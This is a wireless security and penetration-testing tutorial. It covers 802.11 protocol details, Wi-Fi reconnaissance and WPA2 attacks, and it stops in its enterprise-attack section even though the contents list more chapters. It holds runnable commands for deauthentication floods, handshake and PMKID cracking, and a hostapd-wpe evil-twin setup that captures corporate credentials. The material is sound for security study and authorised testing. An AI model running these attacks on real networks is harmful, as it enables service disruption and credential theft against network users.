# Wireless Network Security and IoT Penetration Testing

## From Protocol Analysis to Embedded Device Exploitation

---

## Table of Contents

1. [Wireless Security Fundamentals](#1-wireless-security-fundamentals)
2. [WiFi Reconnaissance and Scanning](#2-wifi-reconnaissance-and-scanning)
3. [WPA2 Attacks](#3-wpa2-attacks)
4. [WPA3 Security Analysis](#4-wpa3-security-analysis)
5. [Rogue Access Point and Evil Twin](#5-rogue-access-point-and-evil-twin)
6. [Bluetooth and BLE Security](#6-bluetooth-and-ble-security)
7. [IoT Attack Surface](#7-iot-attack-surface)
8. [IoT Penetration Testing Methodology](#8-iot-penetration-testing-methodology)
9. [Industrial IoT and SCADA Security](#9-industrial-iot-and-scada-security)
10. [Lab: Wireless and IoT Testing](#10-lab-wireless-and-iot-testing)

---

## 1. Wireless Security Fundamentals

### 1.1 802.11 Protocol Stack

The IEEE 802.11 standard defines wireless LAN operations across a layered architecture that maps onto the OSI model but diverges from wired Ethernet at layers 1 and 2.

#### Physical Layer (PHY)

The PHY layer handles radio frequency transmission and reception. Each 802.11 amendment defines a different modulation scheme, channel width, and spatial stream configuration:

| Amendment | Band | Max Channel Width | Modulation | Max PHY Rate |
|-----------|------|-------------------|------------|--------------|
| 802.11a | 5 GHz | 20 MHz | OFDM (64-QAM) | 54 Mbps |
| 802.11b | 2.4 GHz | 22 MHz | DSSS/CCK | 11 Mbps |
| 802.11g | 2.4 GHz | 20 MHz | OFDM (64-QAM) | 54 Mbps |
| 802.11n (Wi-Fi 4) | 2.4/5 GHz | 40 MHz | OFDM (64-QAM), MIMO | 600 Mbps |
| 802.11ac (Wi-Fi 5) | 5 GHz | 160 MHz | OFDM (256-QAM), MU-MIMO | 6.93 Gbps |
| 802.11ax (Wi-Fi 6/6E) | 2.4/5/6 GHz | 160 MHz | OFDMA (1024-QAM), MU-MIMO | 9.6 Gbps |
| 802.11be (Wi-Fi 7) | 2.4/5/6 GHz | 320 MHz | OFDMA (4096-QAM), MLO | 46 Gbps |

The PHY layer prepends a PLCP (Physical Layer Convergence Procedure) header to each MPDU, which includes rate and length information needed by the receiver before it can decode the payload. The preamble preceding the PLCP header is used for synchronization and channel estimation.

Security relevance: PHY-layer information (signal strength, modulation, channel) is visible in monitor mode and used for client fingerprinting, rogue AP detection, and signal analysis during wardriving.

#### MAC Layer

The MAC sublayer implements the Distributed Coordination Function (DCF) using CSMA/CA (Carrier Sense Multiple Access with Collision Avoidance). Key mechanisms:

- **Virtual carrier sensing** via the NAV (Network Allocation Vector), set through RTS/CTS frames
- **Inter-Frame Spacing** — SIFS, DIFS, EIFS define priority levels for frame transmission
- **Backoff timer** — exponential random backoff for collision avoidance
- **Fragmentation** — splitting large frames at the MAC layer (exploited in FragAttacks, CVE-2020-24586 through CVE-2020-24588)

The MAC header structure contains critical information for wireless attacks:

```
┌──────────────────────────────────────────────────────────────────────┐
│ Frame  │ Duration │ Address 1 │ Address 2 │ Address 3 │ Seq  │ Addr │
│ Control│   /ID    │  (DA/RA)  │  (SA/TA)  │  (BSSID)  │ Ctrl │  4   │
│ 2 bytes│ 2 bytes  │  6 bytes  │  6 bytes  │  6 bytes  │2 byte│6 byte│
└──────────────────────────────────────────────────────────────────────┘
```

Address field semantics change depending on the ToDS/FromDS bits in the Frame Control field:

| ToDS | FromDS | Address 1 | Address 2 | Address 3 | Address 4 |
|------|--------|-----------|-----------|-----------|-----------|
| 0 | 0 | DA | SA | BSSID | N/A |
| 1 | 0 | BSSID | SA | DA | N/A |
| 0 | 1 | DA | BSSID | SA | N/A |
| 1 | 1 | RA | TA | DA | SA |

The fourth case (ToDS=1, FromDS=1) is used in WDS (Wireless Distribution System) and mesh networking.

#### Management Frames

Management frames handle network discovery, authentication, and association. They are transmitted unencrypted in WPA2 (a fundamental weakness addressed by 802.11w/PMF). Frame types critical for offensive operations:

| Subtype | Frame | Offensive Relevance |
|---------|-------|---------------------|
| 0000 | Association Request | Client fingerprinting, capability enumeration |
| 0001 | Association Response | AP capability disclosure |
| 0100 | Probe Request | SSID enumeration, client tracking, KARMA attacks |
| 0101 | Probe Response | Hidden SSID disclosure, AP impersonation |
| 1000 | Beacon | Network discovery, SSID/cipher enumeration |
| 1011 | Authentication | WEP shared key attack, SAE handshake |
| 1100 | Deauthentication | Forced disconnection, handshake capture trigger |
| 1101 | Action | 802.11w protected management frames |

### 1.2 Authentication and Association Process

The 802.11 connection lifecycle follows a strict state machine:

```
┌──────────────┐   Authentication   ┌────────────────┐   Association   ┌──────────────┐
│ State 1:     │──────────────────▶│ State 2:        │───────────────▶│ State 3:      │
│ Unauthenti-  │                   │ Authenticated,  │                │ Authenticated,│
│ cated,       │◀──────────────────│ Unassociated    │◀───────────────│ Associated    │
│ Unassociated │   Deauthentication│                 │  Disassociation│               │
└──────────────┘                   └────────────────┘                └──────────────┘
                                                                            │
                                                                     4-Way Handshake
                                                                     (WPA2) or SAE
                                                                     (WPA3)
                                                                            │
                                                                            ▼
                                                                     ┌──────────────┐
                                                                     │ State 4:      │
                                                                     │ Fully         │
                                                                     │ Connected     │
                                                                     └──────────────┘
```

**Open System Authentication** (used by WPA2): Authentication is a two-frame exchange that always succeeds. The real authentication happens during the 4-way handshake after association. This means any client can reach State 3 before being challenged, which is why deauthentication attacks are possible against established sessions.

**SAE Authentication** (WPA3): Authentication involves a multi-round Dragonfly key exchange before association, providing mutual authentication at the protocol level. See Section 4.

### 1.3 WEP to WPA3 — Protocol Evolution and Weaknesses

#### WEP (Wired Equivalent Privacy) — Broken, Deprecated

WEP uses RC4 stream cipher with a 24-bit Initialization Vector (IV) concatenated with the static key to produce a per-packet keystream. Weaknesses are catastrophic:

- **24-bit IV space**: 2^24 = 16,777,216 possible IVs. On a busy network, IV reuse occurs within hours, enabling keystream recovery.
- **FMS attack (Fluhrer, Mantin, Shamir, 2001)**: Exploits weak IVs where the first bytes of the RC4 key schedule leak key material. Approximately 60,000 captured packets suffice for key recovery.
- **KoreK/PTW attack**: Improved statistical attack needing ~40,000 packets for 104-bit key recovery. The PTW (Pyshkin, Tews, Weinmann) attack reduces this to ~20,000 packets with 95% success rate.
- **CRC-32 ICV**: The Integrity Check Value uses linear CRC-32, allowing bit-flipping attacks without detection. An attacker can modify encrypted packets and compute a valid ICV for the altered payload.
- **Shared Key Authentication leak**: When shared key authentication is used, the challenge-response exchange exposes one keystream, enabling packet injection without knowing the key.

WEP can be cracked in under a minute on a moderately active network. It must not be deployed under any circumstances.

#### WPA (Wi-Fi Protected Access) — Transitional

WPA was a stopgap solution using TKIP (Temporal Key Integrity Protocol) while 802.11i was finalized. TKIP improved upon WEP by introducing:

- Per-packet key mixing to eliminate IV correlation
- MIC (Message Integrity Check) using Michael algorithm
- IV sequencing to prevent replay attacks

TKIP weaknesses:
- **Beck-Tews attack (2008)**: Exploits the Michael MIC algorithm to decrypt short packets (ARP) and inject 7 arbitrary packets. Requires QoS/WMM enabled and ~12-15 minutes.
- **Ohigashi-Morii improvement (2009)**: Reduced the Beck-Tews attack to 1 minute by exploiting the MIC countermeasure timer.
- TKIP is deprecated as of 802.11-2012. WPA with TKIP must not be deployed.

#### WPA2 (802.11i) — Current Standard

WPA2 mandates CCMP (Counter Mode with CBC-MAC Protocol) using AES-128. The security architecture involves a key hierarchy:

```
PMK (Pairwise Master Key)
 │
 ├──▶ PTK (Pairwise Transient Key) = PRF-X(PMK, "Pairwise key expansion",
 │         Min(AA,SPA) || Max(AA,SPA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))
 │    │
 │    ├──▶ KCK (Key Confirmation Key) — 128 bits — EAPOL MIC computation
 │    ├──▶ KEK (Key Encryption Key) — 128 bits — EAPOL key data encryption
 │    └──▶ TK (Temporal Key) — 128 bits — data encryption (CCMP)
 │
 └──▶ GMK → GTK (Group Temporal Key) — broadcast/multicast encryption
```

WPA2-PSK derives the PMK from the passphrase: `PMK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096, 256)`. The SSID as salt means identical passphrases produce different PMKs on different networks, but precomputed PMK tables for common SSIDs (e.g., "linksys", "default") exist.

WPA2 weaknesses:
- **Offline dictionary attack**: The 4-way handshake provides enough material to verify passphrase guesses offline. Weak passphrases fall quickly to hashcat/john.
- **PMKID attack**: The first message of the 4-way handshake is not required. The AP's beacon or association response contains a PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA), enabling offline cracking without a full handshake capture.
- **KRACK (Key Reinstallation Attack, CVE-2017-13077 through CVE-2017-13088)**: Exploits the handshake state machine to force nonce reuse, enabling keystream recovery and packet decryption/injection. Particularly devastating against Linux/Android wpa_supplicant 2.4-2.6, where an all-zero TK is installed.
- **Unprotected management frames**: Deauthentication and disassociation frames can be forged, enabling DoS and handshake capture triggers.
- **Hole196**: Insider attack exploiting GTK to launch ARP poisoning within the BSS. Any authenticated client can inject broadcast frames encrypted with the shared GTK.

#### WPA3 (802.11-2020)

WPA3 addresses WPA2's core weaknesses:

- **SAE (Simultaneous Authentication of Equals)**: Replaces PSK authentication with a Dragonfly key exchange, providing resistance to offline dictionary attacks.
- **Protected Management Frames (PMF/802.11w)**: Mandatory, preventing deauthentication/disassociation attacks.
- **192-bit security mode**: Optional enterprise mode using CNSA-compliant cryptographic suite (GCMP-256, HMAC-SHA-384, ECDH/ECDSA with P-384).
- **OWE (Opportunistic Wireless Encryption)**: Replaces open networks with encrypted connections using unauthenticated Diffie-Hellman, preventing passive eavesdropping on open hotspots.

See Section 4 for WPA3-specific vulnerabilities.

### 1.4 802.1X/EAP Framework

Enterprise wireless networks use 802.1X port-based access control with EAP (Extensible Authentication Protocol) for authentication against a backend RADIUS server.

```
┌──────────┐       EAP over LAN       ┌──────────────┐      RADIUS      ┌──────────┐
│          │    (EAPOL / 802.1X)       │              │   (UDP 1812)     │          │
│ Supplicant│◀─────────────────────────▶│ Authenticator│◀────────────────▶│  RADIUS  │
│ (Client) │                           │    (AP)      │                  │  Server  │
│          │                           │              │                  │          │
└──────────┘                           └──────────────┘                  └──────────┘
```

The AP acts as a relay (authenticator), passing EAP messages between the supplicant and the RADIUS server. The AP does not make authentication decisions; it enforces the RADIUS Access-Accept/Reject outcome by opening or blocking the port.

#### EAP Methods

| Method | Inner Auth | Server Cert Required | Client Cert Required | Security Level |
|--------|-----------|---------------------|---------------------|----------------|
| EAP-TLS | N/A (mutual TLS) | Yes | Yes | Highest — mutual certificate authentication |
| PEAP (PEAPv0/EAP-MSCHAPv2) | MSCHAPv2 | Yes | No | High — server cert validates identity |
| EAP-TTLS | PAP/CHAP/MSCHAPv2 | Yes | No | High — tunneled inner authentication |
| EAP-FAST | PAC (Protected Access Credential) | Optional | No | Medium — PAC provisioning may be vulnerable |

**EAP-TLS**: The gold standard. Both client and server present X.509 certificates. No inner authentication is needed because the TLS handshake provides mutual authentication. Drawback: PKI overhead (certificate distribution, revocation management).

**PEAP**: Creates a TLS tunnel to the RADIUS server, then runs MSCHAPv2 inside the tunnel. The server certificate validates the RADIUS server's identity. Critical misconfiguration: clients that do not validate the server certificate are vulnerable to evil twin attacks where a rogue AP presents its own certificate.

**EAP-TTLS**: Similar to PEAP but supports a wider range of inner authentication methods, including PAP (which sends credentials in cleartext inside the TLS tunnel — secure if the tunnel integrity is maintained, but catastrophic if the client accepts a rogue certificate).

**EAP-FAST**: Cisco proprietary. Uses Protected Access Credentials (PACs) instead of certificates. Automatic PAC provisioning (Phase 0) is vulnerable to MITM if anonymous DH is used. Manual PAC provisioning is more secure but operationally complex.

#### RADIUS Architecture

RADIUS (Remote Authentication Dial-In User Service, RFC 2865/2866) uses a shared secret between the authenticator and the RADIUS server. Security considerations:

- RADIUS shared secrets should be at least 22 characters, randomly generated. Weak shared secrets enable offline brute-force of the RADIUS traffic.
- User-Password attribute is encrypted with MD5(secret || Request Authenticator). MD5 weaknesses make this concerning for high-security environments.
- **RadSec (RADIUS over TLS, RFC 6614)** encrypts the entire RADIUS communication, eliminating shared secret weaknesses.
- RADIUS server must validate client certificates for EAP-TLS and must present a valid server certificate for PEAP/TTLS.

### 1.5 Wireless Attack Taxonomy

```
Wireless Attacks
├── Reconnaissance
│   ├── Passive sniffing (monitor mode)
│   ├── Active probing
│   ├── Client enumeration
│   └── War driving / walking
│
├── Authentication Attacks
│   ├── PSK cracking (dictionary / brute force)
│   ├── PMKID attack
│   ├── WEP cracking (PTW/FMS)
│   ├── Enterprise credential theft
│   └── SAE side-channel (Dragonblood)
│
├── Denial of Service
│   ├── Deauthentication flood
│   ├── Disassociation flood
│   ├── CTS/RTS flood (NAV attack)
│   ├── Authentication flood
│   └── RF jamming
│
├── Man-in-the-Middle
│   ├── Evil twin AP
│   ├── KARMA attack
│   ├── MANA attack
│   ├── Captive portal phishing
│   └── SSL stripping (via rogue AP)
│
├── Protocol Exploitation
│   ├── KRACK (key reinstallation)
│   ├── FragAttacks (fragmentation/aggregation)
│   ├── Hole196 (GTK exploitation)
│   └── 802.11r FT vulnerability
│
└── Post-Authentication
    ├── ARP poisoning over wireless
    ├── DNS spoofing
    ├── Traffic interception
    └── Lateral movement
```

---

## 2. WiFi Reconnaissance and Scanning

### 2.1 Monitor Mode and Passive Monitoring

Monitor mode places the wireless interface in a promiscuous-equivalent state for 802.11, capturing all frames on a given channel regardless of BSSID association. Not all wireless chipsets support monitor mode; the Atheros AR9271 (ALFA AWUS036NHA), Ralink RT3070 (ALFA AWUS036NH), and Realtek RTL8812AU (ALFA AWUS036ACH) are widely used for penetration testing.

```bash
# Kill processes that may interfere with monitor mode
sudo airmon-ng check kill

# Enable monitor mode on wlan0 (creates wlan0mon)
sudo airmon-ng start wlan0

# Verify monitor mode is active
iwconfig wlan0mon
# Mode should show "Monitor"

# Alternative: manual monitor mode with iw
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Set specific channel
sudo iw dev wlan0mon set channel 6

# Set channel width for 802.11ac captures
sudo iw dev wlan0mon set channel 36 HT40+
sudo iw dev wlan0mon set channel 36 80MHz
```

#### Channel Hopping

Channel hopping allows a single adapter to survey all channels by rapidly switching between them. The tradeoff is time-on-channel: faster hopping covers more channels but may miss frames on any given channel.

```bash
# airodump-ng default channel hopping (2.4 GHz channels 1-14)
sudo airodump-ng wlan0mon

# Restrict to 5 GHz channels
sudo airodump-ng wlan0mon --band a

# Both bands
sudo airodump-ng wlan0mon --band abg

# Fixed channel (no hopping — essential for targeted capture)
sudo airodump-ng wlan0mon --channel 6

# Custom channel list
sudo airodump-ng wlan0mon --channel 1,6,11
```

#### Beacon Capture and Analysis

Beacons are broadcast at the TBTT (Target Beacon Transmission Time), typically every 102.4 ms (100 TU). Each beacon contains the SSID (unless hidden), supported rates, channel, RSN Information Element (cipher suites, AKM suites), country information, and vendor-specific IEs.

```bash
# Capture beacons with tshark for detailed analysis
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.sa -e wlan.ssid -e wlan_radio.channel \
  -e wlan.rsn.akms.type -e wlan.rsn.pcs.type

# Decode RSN IE to identify cipher and AKM suites
# AKM type 2 = PSK, type 1 = 802.1X, type 8 = SAE (WPA3)
# PCS type 4 = CCMP-128, type 9 = GCMP-256
```

### 2.2 airodump-ng Complete Usage

airodump-ng is the primary tool for wireless network discovery and packet capture in the aircrack-ng suite.

```bash
# Basic scan — all channels, all bands
sudo airodump-ng wlan0mon

# Output format explanation:
#
# BSSID              PWR Beacons  #Data #/s  CH  MB  ENC  CIPHER AUTH ESSID
# AA:BB:CC:DD:EE:FF  -45  1203    5462  15   6   54e WPA2 CCMP   PSK  TargetNet
#
# PWR: Signal strength in dBm (-30 is strong, -80 is weak)
# #Data: Number of data frames captured (critical for WEP cracking)
# MB: Maximum speed (e = 802.11n, a = 802.11ac)
# ENC: Encryption type
# AUTH: Authentication type (PSK, MGT for 802.1X, SAE for WPA3)

# Target a specific BSSID and channel — write capture file
sudo airodump-ng wlan0mon \
  --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write capture_target \
  --output-format pcap,csv

# Capture with WPS information
sudo airodump-ng wlan0mon --wps

# Show associated clients (station section)
# STATION            PWR   Rate    Lost  Frames  Notes  Probes
# 11:22:33:44:55:66  -52   24e-24  0     853            home_network,airport_wifi

# Filter by encryption type
sudo airodump-ng wlan0mon --encrypt wpa2
sudo airodump-ng wlan0mon --encrypt wpa3

# Capture to specific directory with GPS data (gpsd must be running)
sudo airodump-ng wlan0mon --write /tmp/wardrive --output-format pcap,csv,gps
```

### 2.3 Kismet — WIDS/WIPS Capabilities

Kismet serves dual roles: a passive wireless scanner/sniffer and a Wireless Intrusion Detection System (WIDS). Since Kismet 2019, it operates as a REST API server with a web UI.

```bash
# Start Kismet with a monitor interface
sudo kismet -c wlan0mon

# Access web UI at http://localhost:2501
# Default credentials: admin / password set on first run

# Kismet data sources support multiple interface types:
# Wi-Fi, Bluetooth (via hci), RTL-SDR, nRF, Zigbee
sudo kismet -c wlan0mon -c hci0 -c rtladsb
```

Kismet WIDS alerts detect:

- **APSPOOF**: Multiple APs advertising the same SSID with different BSSIDs (evil twin indicator)
- **BSSTIMESTAMP**: Inconsistent BSS timestamps suggesting AP impersonation
- **DEAUTHFLOOD / DISASSOCFLOOD**: High rate of deauth/disassoc frames (DoS or handshake capture attack)
- **CHANCHANGE**: Unexpected channel changes by a known AP
- **CRYPTODROP**: AP downgrading encryption (potential downgrade attack)
- **PROBERESP**: Probe responses to broadcast probes (KARMA attack indicator)
- **11KNEIGHBORCHAN**: 802.11k neighbor report manipulation

### 2.4 Client Probing Analysis

When a device is not connected to a network, it sends probe requests for previously known SSIDs (Preferred Network List, PNL). This behavior leaks information about the device's network history.

```bash
# Capture probe requests
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e wlan.sa -e wlan.ssid -e wlan_radio.signal_dbm

# Example output:
# AA:BB:CC:DD:EE:FF    HomeNetwork        -45
# AA:BB:CC:DD:EE:FF    CorpOffice-5G      -45
# 11:22:33:44:55:66    Hilton_WiFi        -62
# 11:22:33:44:55:66    airport_free       -62

# This reveals:
# - Device AA:BB:CC:DD:EE:FF has connected to HomeNetwork and CorpOffice-5G
# - Device 11:22:33:44:55:66 has traveled (hotel, airport)
# - MAC addresses may be randomized (check bit 1 of first octet: 1 = locally administered / randomized)
```

**MAC Randomization Countermeasures**: Modern operating systems (iOS 14+, Android 10+, Windows 10+) randomize MAC addresses for probe requests. Deanonymization techniques include:

- **Information Element fingerprinting**: Supported rates, HT/VHT capabilities, and vendor-specific IEs remain consistent across randomized MACs for the same device.
- **Sequence number analysis**: The 802.11 sequence number counter often persists across MAC randomization events.
- **Timing analysis**: Inter-probe timing patterns can fingerprint specific device models.

### 2.5 Hidden SSID Discovery

A hidden SSID (SSID cloaking) sets the SSID length to 0 in beacons and probe responses. This provides zero security because the SSID is transmitted in cleartext in:

1. Client probe requests for the hidden network
2. Association request frames
3. Reassociation request frames

```bash
# airodump-ng shows hidden SSIDs as <length: N>
# Wait for a client to connect/reconnect, or force it:

# Step 1: Identify the hidden network
sudo airodump-ng wlan0mon
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -42  6   WPA2  PSK   <length: 10>

# Step 2: Deauthenticate a connected client to force reassociation
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 3: airodump-ng will display the SSID when the client reconnects
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -42  6   WPA2  PSK   SecretNet

# Alternative: use mdk4 for more aggressive SSID brute-forcing
sudo mdk4 wlan0mon p -t AA:BB:CC:DD:EE:FF -f /usr/share/wordlists/ssids.txt
```

### 2.6 Signal Analysis and War Driving

#### Directional Antennas

Antenna selection directly impacts engagement success:

| Antenna Type | Gain | Beamwidth | Use Case |
|-------------|------|-----------|----------|
| Omnidirectional dipole | 2-9 dBi | 360 H, ~60-80 V | General scanning |
| Panel/Patch | 8-14 dBi | 30-60 H, 30-60 V | Targeted AP at known direction |
| Yagi-Uda | 12-18 dBi | 15-30 H/V | Long-range targeted capture |
| Parabolic grid | 18-24 dBi | 6-12 H/V | Extreme range (km-scale wardriving) |

Link budget calculation: `Received Power (dBm) = Tx Power + Tx Antenna Gain - Path Loss + Rx Antenna Gain`. At 2.4 GHz, free-space path loss for 100m is approximately 80 dB. A 20 dBi parabolic antenna recovers 18 dB over a standard dipole, effectively tripling the operational range.

#### War Driving Tools

```bash
# Kismet with GPS logging
sudo kismet -c wlan0mon --override channels="1,6,11,36,40,44,48"

# Export to WiGLE-compatible format
kismetdb_to_wiglecsv --in /root/.kismet/Kismet-*.kismet --out wardrive.csv

# Real-time GPS tracking with gpsd
sudo gpsd -n /dev/ttyACM0
cgps -s  # verify GPS fix

# airodump-ng with GPS
sudo airodump-ng wlan0mon --write wardrive --output-format pcap,csv,gps \
  --gpsd --band abg
```

WiFi geolocation: Even without GPS, accumulated wardriving data enables triangulation. WiGLE.net, Apple's location services, and Google's geolocation API map BSSIDs to physical coordinates. A single captured BSSID can be geolocated to within 10-50 meters using public databases.

---

## 3. WPA2 Attacks

### 3.1 4-Way Handshake Capture and Crack

The 4-way handshake is the core target for WPA2-PSK attacks. It uses four EAPOL frames to derive and confirm the PTK:

```
Station (STA)                                    Access Point (AP)
     │                                                │
     │            Message 1: ANonce                    │
     │◀───────────────────────────────────────────────│
     │    (AP sends its random nonce)                  │
     │                                                │
     │    STA computes: PTK = PRF(PMK, ANonce,         │
     │    SNonce, MAC_AP, MAC_STA)                     │
     │                                                │
     │            Message 2: SNonce + MIC              │
     │───────────────────────────────────────────────▶│
     │    (STA sends its nonce, MIC proves PMK         │
     │     knowledge)                                  │
     │                                                │
     │    AP computes same PTK, verifies MIC           │
     │                                                │
     │            Message 3: GTK + MIC                 │
     │◀───────────────────────────────────────────────│
     │    (AP sends encrypted GTK, confirms PTK)       │
     │                                                │
     │            Message 4: ACK + MIC                 │
     │───────────────────────────────────────────────▶│
     │    (STA confirms GTK installation)              │
     │                                                │
     │         Encrypted data exchange begins          │
     │◀──────────────────────────────────────────────▶│
```

To crack the handshake offline, the attacker needs Messages 1 and 2 (or 2 and 3). The MIC in Message 2 is computed as HMAC-SHA1(KCK, EAPOL_frame), and KCK is derived from the PTK, which is derived from the PMK. Since PMK = PBKDF2(passphrase, SSID), the attacker can test passphrases by computing PMK → PTK → KCK → MIC and comparing against the captured MIC.

```bash
# Step 1: Start capture on target channel
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 \
  --write handshake_capture

# Step 2: Deauthenticate a client to trigger handshake (in another terminal)
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 3: airodump-ng displays "WPA handshake: AA:BB:CC:DD:EE:FF" when captured

# Step 4: Verify handshake capture
aircrack-ng handshake_capture-01.cap
# Should show "1 handshake" for the target BSSID

# Step 5: Crack with aircrack-ng (dictionary attack)
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF \
  handshake_capture-01.cap

# Step 6: Crack with hashcat (GPU-accelerated — significantly faster)
# First, convert cap to hashcat format
hcxpcapngtool -o hash.hc22000 handshake_capture-01.cap

# Dictionary attack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With rules for mutation
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Step 7: Crack with john
hcxpcapngtool -o hash.hc22000 handshake_capture-01.cap
hcxhashtool --pmkid-in hash.hc22000 --john-out john_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
```

### 3.2 PMKID Attack

The PMKID attack (discovered by Jens "atom" Steube, 2018) eliminates the need to capture a full handshake. The PMKID is included in the RSN PMKID list of the first EAPOL message or in the AP's robust security network IE:

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
```

The attacker only needs to initiate an association with the AP; no client needs to be connected. This makes it effective against APs with no active clients.

```bash
# Capture PMKID using hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid_dump.pcapng \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2 \
  --enable_status=1

# Wait for "FOUND PMKID" message, then Ctrl+C

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid_dump.pcapng

# Crack with hashcat (mode 22000 handles both PMKID and handshake)
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Verify successful crack
hashcat -m 22000 pmkid.hc22000 --show
```

### 3.3 Deauthentication Attacks

Deauthentication frames are management frames that can be forged because WPA2 does not protect management frames (unless 802.11w/PMF is enabled). Two modes:

```bash
# Targeted deauthentication — specific client from specific AP
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \     # AP BSSID
  -c 11:22:33:44:55:66 \     # Client MAC
  wlan0mon

# Broadcast deauthentication — all clients from AP
sudo aireplay-ng --deauth 0 \  # 0 = continuous
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon

# mdk4 — more advanced deauthentication with reason codes
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66

# Scapy — crafted deauthentication with custom reason code
python3 -c "
from scapy.all import *
import sys

target_client = '11:22:33:44:55:66'
ap_bssid = 'AA:BB:CC:DD:EE:FF'

# Reason code 7: Class 3 frame received from nonassociated STA
pkt = RadioTap() / \
      Dot11(addr1=target_client, addr2=ap_bssid, addr3=ap_bssid) / \
      Dot11Deauth(reason=7)

sendp(pkt, iface='wlan0mon', count=5, inter=0.1)
"
```

### 3.4 PSK Cracking Strategies

The effectiveness of PSK cracking depends on attack strategy, hardware, and passphrase complexity.

**Hashcat performance benchmarks** (approximate, single GPU):

| GPU | Hashcat Mode 22000 (WPA-PBKDF2-PMKID+EAPOL) |
|-----|----------------------------------------------|
| RTX 4090 | ~2.5 MH/s |
| RTX 3090 | ~1.2 MH/s |
| RTX 3080 | ~970 KH/s |
| RX 7900 XTX | ~1.6 MH/s |

At 2.5 MH/s, the full 8-character lowercase alphabet keyspace (26^8 ≈ 209 billion) takes ~23 hours. With mixed case and digits (62^8 ≈ 218 trillion), it takes ~1,009 days. This is why attack strategy matters more than raw speed.

```bash
# Dictionary attack — fastest path for common passphrases
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Rule-based attack — mutates dictionary entries
# Appends digits, capitalizes, common substitutions
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Combinator attack — two dictionaries combined
hashcat -m 22000 hash.hc22000 -a 1 words1.txt words2.txt

# Mask attack — targeted brute force with known patterns
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
# Example: 8-digit passphrase
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Example: Capital + 6 lowercase + 1 digit (common pattern)
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?l?d

# Hybrid attack — dictionary + mask
hashcat -m 22000 hash.hc22000 -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d

# Mask with custom charset
# -1 defines charset 1 as digits + special chars
hashcat -m 22000 hash.hc22000 -a 3 -1 ?d?s ?l?l?l?l?l?1?1?1

# Prince attack (probabilistic password generation from dictionary)
hashcat -m 22000 hash.hc22000 -a 0 /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/prince.rule

# Resume interrupted session
hashcat -m 22000 hash.hc22000 --restore
```

### 3.5 WPA2-Enterprise Attacks

WPA2-Enterprise attacks target the 802.1X/EAP authentication, typically by impersonating the RADIUS server through an evil twin AP.

#### Evil Twin with hostapd-wpe

hostapd-wpe (Wireless Pwnage Edition) is a patched version of hostapd that logs EAP credentials during authentication. It presents a rogue RADIUS server that accepts all EAP authentication attempts while capturing the inner credentials.

```bash
# Install hostapd-wpe (Kali/Parrot)
sudo apt install hostapd-wpe

# Generate rogue certificates
cd /etc/hostapd-wpe/certs
# Edit ca.cnf and server.cnf to match the target organization
# Subject fields should mimic the legitimate RADIUS server certificate
./bootstrap

# Configure hostapd-wpe
cat > /etc/hostapd-wpe/hostapd-wpe.conf << 'HOSTAPD_EOF'
interface=wlan0
ssid=CorpNetwork
channel=6
hw_mode=g
ieee80211n=1

# WPA2-Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# RADIUS (internal FreeRADIUS via hostapd-wpe)
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# EAP-specific options
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
HOSTAPD_EOF

# Launch the evil twin
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials appear in the console:
# mschapv2: Fri Jun 14 10:23:45 2024
#        username: jsmith
#        challenge: a1:b2:c3:d4:e5:f6:a7:b8
#        response:  1a:2b:3c:4d:5e:6f:7a:8b:9c:0d:1e:2f:3a:4b:5c:6d:7e:8f:9a:0b:1c:2d:3e:4f
